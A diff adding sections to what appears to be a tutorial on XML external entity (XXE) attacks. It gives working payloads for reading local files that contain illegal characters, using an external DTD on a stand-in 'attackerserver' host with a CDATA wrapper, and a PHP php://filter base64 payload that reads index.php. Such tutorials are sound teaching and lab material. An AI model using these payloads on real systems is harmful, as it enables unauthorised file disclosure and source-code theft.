@@ -310,6 +310,23 @@ In the case of "&", this is due to parser scanning for an entity's name. Without
 00000060: 7f                                       .
 ```
 
+Supposed there is a file `illegal.txt` that contains some illegal character:
+
+```
+You cannot read me with XXE & < TEST
+```
+
+Performing the following attack to directly retrieve that file would result in error:
+
+```xml
+<!DOCTYPE root [
+	<!ENTITY filecontent SYSTEM "illegal.txt">
+]>
+<root> &filecontent; </root>
+```
+
+So how can we retrieve files with illegal characters like "<" and "&" ?
+
 **Enters CDATA**
 
 Character Data (CDATA) can be used to surround illegal characters to prevent XML parser from parsing them.
@@ -319,6 +336,50 @@ Character Data (CDATA) can be used to surround illegal characters to prevent XML
 ```
 
 if the file content can be surround by `<![CDATA[ ` and `]]>` , the file content can be retrievable. 
+
+This requires a wrapper and the knowledge of the Internal Subset Problem comes to our rescue.
+
+We can use an external *readillegal.dtd* file with CDATA wrapper being <u>html-entity encoded</u>:
+
+```dtd
+<!ENTITY filecontent "&#x3c;&#x21;&#x5b;&#x43;&#x44;&#x41;&#x54;&#x41;&#x5b; %content; &#x5d;&#x5d;&#x3e;" >
+```
+
+Injected Definition & body:
+
+```xml
+<!DOCTYPE root [
+	<!ENTITY % content SYSTEM "illegal.txt">
+	<!ENTITY % dtd SYSTEM "http://attackerserver/readillegal.dtd">
+ 	%dtd;
+]>
+<root> &filecontent; </root>
+```
+
+Output:
+
+```xml
+<root> You cannot read me with XXE &amp; &lt; TEST </root> 
+```
+
+We can successfully read a file with illegal characters. You may try this out with Python-flask-xxe app that will throw you error messages.
+
+However, if the length of the file with illegal characters is too large, XML parser will attempt to throw *"XMLSyntaxError: Detected an entity reference loop"* as it attempts to stop billion laughter attacks. This can be seen when attempting to steal the source code of `app.py`.
+
+**PHP Wrappers**
+
+The PHP language allows stealing of file content regardless whether they contains illegal characters. This is unique to PHP alone. 
+
+PHP has a pseudo url "php://" that when invoked by PHP programs, can be abused to do base64 encoding of a resource before sending to output stream.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [
+	<!ENTITY a SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+
+<name> &a; </name>
+```
 
 ## Great Works by Others
 
